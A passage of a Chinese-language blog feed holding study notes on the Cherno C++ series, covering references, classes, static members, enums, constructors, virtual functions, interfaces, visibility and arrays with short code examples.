class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --- 指针 ---</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">increase</span><span class="params">(<span class="type">int</span> *val)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//(*val)++;  // 必须加括号, ++优先级比*高</span></span><br><span class="line">  ++(*val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">increase</span>(&amp;a);</span><br><span class="line">  std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 引用 ---</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">increase</span><span class="params">(<span class="type">int</span> &amp;val)</span> </span>&#123;</span><br><span class="line">  ++val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">increase</span>(a);</span><br><span class="line">  std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用是引用现有变量的方式，<strong>引用本身只是别名，不是变量，不占内存</strong>，不像指针可以传创建一个新指针变量然后设置它等于空指针或者类似的东西。<br><strong>定义引用后无法修改，声明时必须立即赋值。</strong></p><p><code>int&amp; alias = a;</code>  &amp;是类型的一部分，这与指针中使用到的取地址符不同，这里alias只是别名，通过汇编代码去看的话，只有一个变量</p><blockquote><p>💡 引用和指针的区别：<br>本质上指针是存储地址的对象（变量），而引用是对象的别名，因此：</p><ol><li>指针占内存空间；而引用不占。</li><li>指针不必初始化（这时使用默认初始化）；而引用必须初始化。</li><li>指针可以重新赋值；而引用不能。</li><li>可以存在指针的指针等；而不存在引用的引用。<br>个人理解：引用是指针的语法糖，它自带顶层const属性。</li></ol><p>PS：<br>顶层const（top-level const）：本身是个常量。<br>底层const（low-level const）：所指对象是一个常量。</p></blockquote><h1 id="18-CLASSES-in-C">18 CLASSES in C++</h1><p>类只是方便组合数据和函数的一种简单方式。<strong>任何使用class做的事情，不用class也能做，class并没有提供新的functionality。</strong></p><p>类是一种变量类型，是自定义数据类型的基础。</p><h1 id="19-CLASSES-vs-STRUCTS-in-C">19 CLASSES vs STRUCTS in C++</h1><p>类和结构体唯一区别是：类默认是private的，结构体默认是public的。<br>struct在c++中唯一存在的原因是，C++希望与C保持向后兼容性。</p><p>如果想要所有成员都是public的，然而又不想写上public，应该使用struct吗？——是的，它就算这样的微不足道。 （这个问题不绝对，取决于编程风格）</p><p>从技术上讲，<strong>除了visibility，二者可能没有太大区别</strong>，然而实际的使用情况会有所不同。——继承，<strong>不要在struct中使用继承</strong>，若要有一个完整的类层次，使用类。</p><h1 id="20-How-to-Write-a-C-Class">20 How to Write a C++ Class</h1><p>这节讲类讲的非常简单，本节给出了一个Log类的例子，第23节[”ENUMS in C++“](./# ENUMS in C++)中给出了此Log类例子的升级版。</p><h1 id="21-Static-in-C">21 Static in C++</h1><p>static在C++中根据上下文有两种意思，一种是在类或结构体外使用static关键字，一种是在类或结构体内部使用static。</p><ul><li>类外的static，声明为static的符号链接将只在内部，这意味着它只对定义所在的翻译单元可见。</li><li>类或结构体内的static，意味着该变量实际上将与类所有实例共享内存，静态变量只有1个实例。</li></ul><p><strong>不同文件中不能有同名的全局变量</strong>，除非使用static修饰，或者在某个文件中使用 <code>extern</code> 声明。</p><p>全局变量不好，一定要尽可能使用static，除非真的需要跨翻译单元链接。</p><h1 id="22-Static-for-Classes-and-Structs-in-C">22 Static for Classes and Structs in C++</h1><p>通过类实例引用静态变量无意义，因为类静态变量就像类的全局实例一样。<br>静态方法也是一样，<strong>无法访问类的实例</strong>，静态方法不需要通过类的实例被调用，而在静态方法内部，不能写引用到类实例的代码，<strong>静态方法也不能访问非静态变量</strong>。</p><blockquote><p>💡 在类中写的每个非静态方法总会获得当前类的一个实例作为参数，而静态方法不会获得那个隐藏参数，所以不能访问非静态变量。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> x, y;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Entity::x, Entity::y;  <span class="comment">// 一定要声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e1;</span><br><span class="line">  e1.x = <span class="number">2</span>;</span><br><span class="line">  e1.y = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Entity e2 = &#123;5, 8&#125;;  // 加上static后x和y不再是成员变量，不能这样初始化</span></span><br><span class="line">  Entity e2;</span><br><span class="line">  e2.x = <span class="number">5</span>;</span><br><span class="line">  e2.y = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  e1.<span class="built_in">print</span>();</span><br><span class="line">  e2.<span class="built_in">print</span>();</span><br><span class="line">  <span class="comment">// Entity::print(); 如果成员方法不加static不能这样: 调用非静态成员函数需要一个对象</span></span><br><span class="line">  <span class="comment">// 如果加上static, 既可通过对象,又可通过Entity::print();</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// === 输出 ===</span></span><br><span class="line">x = <span class="number">5</span> y = <span class="number">8</span></span><br><span class="line">x = <span class="number">5</span> y = <span class="number">8</span></span><br></pre></td></tr></table></figure><h1 id="23-ENUMS-in-C">23 ENUMS in C++</h1><p>enumeration 是一组值的集合，是一种<strong>命名值的方式</strong>（枚举数其实就是一个<strong>整数</strong>）。<br>当想使用整数来表示某些状态或某些数值时，它非常有用。</p><ul><li>第一个元素默认是0，第二个往后默认增1</li><li>enum元素类型默认是int，可以通过如下方式修改为<code>unsigned char</code></li><li>第6行后value的类型可以写 unsigned char，也可以写Example**，写后者的话就限制在A、B、C三个值中（当然也可以绕过）**。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Example</span> : <span class="type">unsigned</span> <span class="type">char</span> &#123;</span><br><span class="line">  A = <span class="number">5</span>, B, C</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Example value = B;</span><br><span class="line">  <span class="keyword">if</span> (value == <span class="number">6</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;value = 6&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给出一个更偏实际的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Log</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">enum</span>  <span class="title class_">Level</span> &#123;</span><br><span class="line">LevelError = <span class="number">0</span>, LevelWarning, LevelInfo  <span class="comment">// 不要用Error: 和Error函数同名</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Level m_LogLevel = LevelInfo;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetLevel</span><span class="params">(Level level)</span> </span>&#123;</span><br><span class="line">m_LogLevel = level;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Error</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelError) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[ERROR]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Warn</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelWarning) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[WARNING]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Info</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_LogLevel &gt;= LevelInfo) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[INFO]:&quot;</span> &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Log log;</span><br><span class="line">log.<span class="built_in">SetLevel</span>(Log::LevelError);  <span class="comment">// 这里Level只是普通的枚举数，不是枚举类，Level不是真正的命名空间</span></span><br><span class="line">log.<span class="built_in">Error</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Warn</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">log.<span class="built_in">Info</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="24-Constructors-in-C">24 Constructors in C++</h1><p>构造函数最通用用法：创建类的实例时<strong>初始化该类，确保初始化了所有的内存</strong>。</p><p>Java等语言对于数据基本类型，比如int和float会自动初始化为0，但是C++不会，必须手动初始化所有基本类型。</p><p>可以写多个构造函数，前提是它们有不同的参数（函数重载：<strong>同域</strong>下的同名函数的不同版本）。</p><p><strong>若不实例化对象，将不会运行构造方法，比如只使用一个类的静态方法。</strong><br>当使用new创建一个对象时，也会调用构造方法。</p><blockquote><p>💡 <strong>删除构造函数的方法：</strong></p><ol><li>设置private隐藏构造函数</li><li><code>Log() = delete;</code></li></ol></blockquote><h1 id="25-Destructors-in-C">25 Destructors in C++</h1><p>任何时候，一个对象要被销毁时，析构函数将被调用。</p><p>析构函数同样适用于堆和栈分配的对象，堆：调用delete时析构函数将被调用；栈：当作用域结束时，栈对象将被删除——不要主动调用，<strong>否则会造成double destruct</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">float</span> X, Y;</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    X = <span class="number">0.0f</span>, Y = <span class="number">0.0f</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">float</span> x, <span class="type">float</span> y) &#123;  <span class="comment">// 重载构造函数</span></span><br><span class="line">    X = x, Y = y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; X &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; Y &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">Entity <span class="title">e</span><span class="params">(<span class="number">0.1</span>, <span class="number">9.9</span>)</span></span>;</span><br><span class="line">  e.<span class="built_in">Print</span>();  <span class="comment">// 作用域结束时，栈对象被删除，析构函数被调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Function</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="26-Inheritance">26 Inheritance</h1><p><strong>继承：避免代码重复，扩展现有类并为基类提供新功能的一种方式。</strong></p><p>父类是子类的子集，子类是父类的超集。如果开始重写函数和Player类，就需要维护一个虚函数表（V表），需要额外占用内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">float</span> X, Y;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span> </span>&#123;</span><br><span class="line">    X = x, Y = y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name;  <span class="comment">// x86下为4字节，x64下地址占8字节</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="keyword">sizeof</span> Entity &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; <span class="keyword">sizeof</span> Player &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Player player;</span><br><span class="line">  player.<span class="built_in">move</span>(<span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">  player.X = <span class="number">2</span>;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意上述代码中 <code>sizeof Player</code> 的结果在x86和x64下不同，地址位数不同。</p><p><strong>多态：使用一种类型表示多种类型，比如Player不只是Player也是Entity</strong>，可以在任何需要使用Entity的地方使用Player。</p><h1 id="27-Virtual-Functions">27 Virtual Functions</h1><p>虚函数允许在子类中重写方法：若B是A的子类，可以在A类中创建一个方法，标记为virtual，可选择在B类中重写那个方法，让它做其他事情。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">std::string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Entity&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Player</span>(<span class="type">const</span> std::string &amp;name)</span><br><span class="line">    : <span class="built_in">m_name</span>(name) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">std::string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> m_name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity* e = <span class="keyword">new</span> <span class="built_in">Entity</span>();</span><br><span class="line">  std::cout &lt;&lt; e-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Player* p = <span class="keyword">new</span> <span class="built_in">Player</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">  std::cout &lt;&lt; p-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  Entity* entity = p;</span><br><span class="line">  std::cout &lt;&lt; entity-&gt;<span class="built_in">getName</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 输出 ---</span></span><br><span class="line">Entity</span><br><span class="line">JKA</span><br><span class="line">Entity </span><br></pre></td></tr></table></figure><p>上面代码中， Player类型的p被赋值给声明为Entity的变量，调用getName()的是Entity的getName()。</p><p>原因：通常在我们声明函数时，我们的方法通常在类内部起作用，然后当要调用方法时，会调用属于该类的方法。可以通过虚函数解决此问题。</p><p><strong>虚函数引入了一种称为Dynamic Dispatch（动态联编）的东西，它通常通过v表（虚函数表）来实现编译，v表就是一个表，它包含基类中所有虚函数的映射，这样就可在运行时将它们映射到正确的覆写（override）函数。</strong><br>如果想覆写一个函数，必须将基类中的基函数标记为虚函数：</p><ol><li>父类加上virtual关键字。</li><li>子类加上override关键字（C++11），好处：1.易读；2.减少错误：如果函数名称写错了——和父类函数名不同，就报错提醒。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::string <span class="title">GetName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Entity&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Player</span>(<span class="type">const</span> std::string &amp;name)</span><br><span class="line">    : <span class="built_in">m_name</span>(name) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">std::string <span class="title">GetName</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> m_name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 输出 ---</span></span><br><span class="line">Entity</span><br><span class="line">JKA</span><br><span class="line">JKA</span><br></pre></td></tr></table></figure><p>虚函数有两种<strong>运行时成本</strong>：</p><ol><li><strong>存储v表</strong>内存：基类中要有一个成员指针，指向v表。</li><li>每次调用虚函数时，需要<strong>遍历</strong>这个表，来确定映射到哪个函数。</li></ol><h1 id="28-Interfaces-in-C-Pure-Virtual-Functions">28 Interfaces in C++ (Pure Virtual Functions)</h1><p>C++中<strong>纯虚函数允许我们在基类中定义一个没有实现的函数，然后强制子类去实现该函数</strong>。确保每个类都有一个特定的方法，可以将该抽象类作为参数（类型）放入一个通用函数中。C++11中无interface关键字，其实还是一个类，<strong>只不过有一个未实现的虚函数。</strong></p><p>类中的接口只包含未实现的方法，作为模版。<br>由于此接口类实际不包含方法实现，实际上不可能实例化那个类，在子类中实现后可以实例化。</p><p>纯虚函数应该理解为<strong>虚函数 + 类不可实例化标记。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Printable</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> std::string <span class="title">GetClasName</span><span class="params">()</span> </span>= <span class="number">0</span>;  <span class="comment">// 函数体=0，表示为纯虚函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="29-Visibility-in-C">29 Visibility in C++</h1><p>可见性指类的某些成员或者方法实际上有多可见，是对程序实际运行方式完全没有影响的东西，对程序的性能和类似的东西也没有影响（可见性不是cpu需要理解的东西）。</p><p>C++中有三个基础的可见性修饰符：<code>private</code>、<code>protected</code> 和 <code>public</code>，class中如果不写则默认为private，struct中默认为public。<br>扩展：Java中还可以使用default（不写）可见修饰符，C#中还有internal。</p><ul><li>private意味着只有<strong>友元</strong>和<strong>目标类可以访问private变量，子类也不能访问</strong>。<br>在C++中有个叫friend的东西，可让其他类或者函数成为目标类的友元，实际上可以从类中访问私有成员。</li><li><strong>protected意味着目标类和层次结构中的所有子类可以访问这些符号。</strong></li></ul><p>可见性的好处：确保人们不会调用不该调用的代码该破坏。<br>一个关于UI的例子：使用按钮改变位置时如果只是修改X=5，显示器会使用内存中旧的X值，一个做法是声明X为private（提醒自己和他人不要通过赋值修改X），而给出一个public的SetX()其中实现修改X并刷新显示器的功能。</p><h1 id="30-Arrays-in-C">30 Arrays in C++</h1><p><code>arr[-1]=0</code> Memory access violation。<br>在Debug模式下会得到一个程序崩溃的错误信息。<br>但在Release模式下可能不会得到报错信息，已经写入了不属于你的内存。</p><p><code>&lt;=</code> 运算时，在做小于以及等于的比较——影响性能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> arr[count];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> arr[count];</span><br></pre></td></tr></table></figure><p><code>int arr[5];</code> 是在栈上创建数组，作用域结束时内存释放。<br><code>**int* arr = new int[5];</code> 在堆上创建数组，直到程序把它销毁之前都存在，销毁：<code>delete[] arr;</code> 。**</p><p>在堆上创建数组的原因：最大的原因是生存期：**如果有一个函数需要返回一个数组，这个数组在函数中创建，则必须使用new，**另一个原因是数据量太大，堆上放不下。</p><p><strong>sizeof 栈数组 得到数组大小</strong>，sizeof 堆数组 只能得到数组地址大小。</p><p>在堆上创建内存会导致 <strong>内存间接寻址（Memory Indirection）</strong>：一个指针，指向另一个内存块（保存实际的数组）。内存中跳跃影响性能，还可能会导致内存碎片（Memory fragmentation），缓存丢失（cache miss）。</p><p>标准数组：std::array 内置在C++库。优点：边界检查，记录数组大小，这会带来较小的性能损耗。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::array&lt;<span class="type">int</span>, 5&gt; another;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第2讲 数据结构</title>
      <link href="/2022/12/26/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
